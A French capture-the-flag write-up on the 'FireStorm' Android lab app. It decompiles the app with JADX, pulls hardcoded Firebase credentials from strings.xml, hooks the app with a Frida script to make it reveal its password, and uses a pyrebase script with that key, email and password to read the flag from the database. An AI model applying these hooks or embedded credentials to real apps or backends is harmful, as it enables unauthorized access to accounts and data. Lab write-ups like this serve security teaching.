# Audit Approfondi de Vulnérabilités : FireStorm (LAB 18)

## Contexte Technologique
L'objectif de cette étude ciblée réside dans l'auscultation du fichier `FireStorm`. Ce dernier exige un protocole hybride redoutable combinant un décryptage du fichier fermé (analyse statique) et une manipulation du flux en temps réel avec injection de script (instrumentation dynamique).

---

## Kit Opérationnel
- **Environnement de Simulation** : Android Studio / Emulateurs.
- **Pont de Liaison (ADB)** : Transport de paquets via command-lines.
- **Rétro-Ingénierie Statique** : Exploitation métier de JADX-GUI.
- **Hooking Memoire Dynamique** : Utilitation du serveur Frida.
- **Moteurs Logiciels** : Scripts Pythons dédiés et manipulation backend `Pyrebase`.

---

## Étape 1 : Amorce et Installation
Le laboratoire démarre sur l'installation logicielle classique de l'application via le pont réseau ADB, pour ensuite forcer le listage des processus du bac à sable Android via Frida.
```bash
adb install FireStorm.apk
python -m frida_tools.ps -Uai
```
Les remontées d'informations isolent nominalement le package cible sous le dictionnaire : `com.pwnsec.firestorm`

![Installation and package identification](./Images/installation.png)
*Figure 1 : Interrogation de la signature de l'application active.*

---

## Étape 2 : Lancement Initial
Le binaire installé est exécuté physiquement à l'écran de l'émulateur afin de modéliser visuellement le comportement global.

![FireStorm running on emulator](./Images/emulator.png)
*Figure 2 : Visuel du client FireStorm sous Android VM.*

---

## Étape 3 : Exploration du Code Mort via JADX
En ré-encapsulant l'application sous JADX-GUI, il est devient abordable d'ausculter l'implémentation Java.

### Traces d'Architecture Intéressantes
- Composant noyau : `MainActivity`
- Pont applicatif C++ repéré : `firestorm`

Au sein du bloc d'instructions gérant la classe principale, une méthode étonnante appelée `Password()` a retenu immédiatement l'attention. Cette déclaration semble être une véritable fonction fantôme, délaissée hors du parcours classique de l'utilisateur. Sa logique construit dynamiquement une longue chaîne en additionnant des morceaux précis des fichiers de langages XML, avant de confier la phase d’authentification à l'exécution d'une routine compilée.

```java
public String Password() {
    StringBuilder sb = new StringBuilder();
    String string = getString(R.string.Friday_Night);
    // Combinaisons et découpages via substrings...
    sb.append(string.substring(5, 9));
    return generateRandomString(String.valueOf(sb));
}
```

![MainActivity in JADX](./Images/mainactivity.png)
*Figure 3 : Mise en lumière de la fonction fantôme impliquant des processus natifs.*

---

## Étape 4 : Détection du Déport Natif
Le pont qui relie ce code à des modules externes est justifié explicitement :
```java
System.loadLibrary("firestorm");
```
Il s'agit donc bien là du cerveau protecteur régénérant les signatures de connexions : `libfirestorm.so`. Le contournement par analyse C++ complexe est en réalité dispensable. Nous allons plutôt forcer le téléphone à résoudre cet algorithme via lui-même dans les étapes suivantes.

![libfirestorm.so in JADX](./Images/libfirestorm.png)
*Figure 4 : Repérage de l'artefact compilé en C++ et jointures du binaire.*

---

## Étape 5 : Compromission du Backend Firebase
Une simple étude analytique au sein des dossiers `/res/values/` dévoile des données sensibles au niveau de `strings.xml`.
```xml
<string name="firebase_api_key">AIzaSyAXsK0qsx4RuLSA9C8IPSWd0eQ67HVHuJY</string>
<string name="firebase_email">TK757567@pwnsec.xyz</string>
<string name="firebase_database_url">https://firestorm-9d3db-default-rtdb.firebaseio.com</string>
```
Il devient de suite factuel que le système opère à travers une architecture de données cloud signée Android `Firebase Realtime Database`.

![Firebase values in strings.xml](./Images/strings_xml.png)
*Figure 5 : Fuite matérielle d'identification Cloud Firebase.*

---

## Étape 6 : Préparation du Service d'Instrumentation (Frida)
Le plan d'attaque nécessite d'injecter la sentinelle `frida-server` directement aux racines Linux du smartphone, d'y élever les accréditations d'exécutions et de lancer l'espionnage asynchrone des threads.
```bash
adb push frida-server-17.9.1-android-x86_64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell "/data/local/tmp/frida-server"
```
Une passerelle mémoire absolue est désormais ouverte entre la machine host et l'émulateur.

![Frida server setup](./Images/frida_server.png)
*Figure 6 : Activation du pôle d'interception asynchrone via ADB.*

---

## Étape 7 : Attaque Dynamique et Capture Native
Grâce à un morceau de programmation en JavaScript, il devient possible de s'insérer activement sur l'occurence mémoire courante de `MainActivity`. Nous contraignons volontairement l'instance à exécuter la fonction dissimulée `Password()`, qui nous livre finalement le fruit de ses calculs natifs.

**Matériel d'Alerte Injecté (`frida_firestorm.js`) :**
```javascript
Java.perform(function () {
    function getPassword() {
        console.log("[*] Scan d'activité des modules cibles...");
        Java.choose("com.pwnsec.firestorm.MainActivity", {
            onMatch: function (instance) {
                console.log("[+] Interception mémoire : " + instance);
                try {
                    var pass = instance.Password();
                    console.log("[+] Mot de passe Firebase cracké : " + pass);
                } catch (e) {
                    console.log("[-] Défaillance au Hook : " + e);
                }
            },
            onComplete: function () {
                console.log("[*] Fin de trace de processus.");
            }
        });
    }
    setTimeout(getPassword, 3000);
});
```

Activation depuis son client Windows Python :
```bash
python -m frida_tools.repl -U -f com.pwnsec.firestorm -l .\frida_firestorm.js
```
La console valide l'assaut et remonte fièrement le Hash complété des serveurs de la base de données.

![Frida script result](./Images/frida_firestorm-js.png)
*Figure 7 : Frida extrait avec un succès décisif les mots de passe internes.*

---

## Étape 8 : Récolte du Sésame Final

Afin de finaliser l'attaque, nous rassemblons les secrets obtenus lors des étapes précédentes :
- **Clé API et Configuration** : Récupérées dans le fichier `strings.xml`.
- **Email** : `TK757567@pwnsec.xyz` (identifié en clair).
- **Mot de passe** : Généré et intercepté dynamiquement grâce à notre hook Frida.

Ces éléments sont injectés dans un script Python d'exploitation (`get_flag.py`) utilisant la bibliothèque `pyrebase` pour simuler une authentification légitime et interroger la base de données :

```python
import pyrebase

config = {
    "apiKey": "AIzaSyAXsK0qsx4RuLSA9C8IPSWd0eQ67HVHuJY",
    "authDomain": "firestorm-9d3db.firebaseapp.com",
    "databaseURL": "https://firestorm-9d3db-default-rtdb.firebaseio.com",
    "storageBucket": "firestorm-9d3db.appspot.com",
    "projectId": "firestorm-9d3db"
}

firebase = pyrebase.initialize_app(config)
auth = firebase.auth()

email = "TK757567@pwnsec.xyz"
password = "C7_dotpsC7t7f_._In_i.IdttpaofoalIdIdnndIfC"

user = auth.sign_in_with_email_and_password(email, password)
print("Connexion reussie. Token obtenu.")

db = firebase.database()

# Récupération du flag depuis la base de données
flag_data = db.get(user['idToken'])
print("FLAG recupere :")
print(flag_data.val())
```

Une fois le script exécuté, le serveur Firebase valide l'accès et délivre le drapeau final.

![Flag retrieval](./Images/flag.png)
*Figure 8 : Intrusion distante Firebase et récupération terminale.*

---

## Drapeau Final (Flag)
```text
PWNSEC{C0ngr4ts_Th4t_w45_4N_345y_P4$$w0rd_t0_G3t!!!_0R_!5_!t???}
```

## Bilan Stratégique
Le challenge illustre prodigieusement la dualité d'une agression sur OS nomade :
- La rétro-ingénierie globale de **JADX** a dessiné le terrain de failles.
- L'injection active **Frida** permet d'esquiver la barrière des bibliothèques binaires obscures, en les faisant formuler des variables sur commande depuis la couche Java en amont.
- Enfin, ce type d'insécurité concernant les jetons API est hélas le talon d'achille régulier des solutions Clouds comme Firebase.
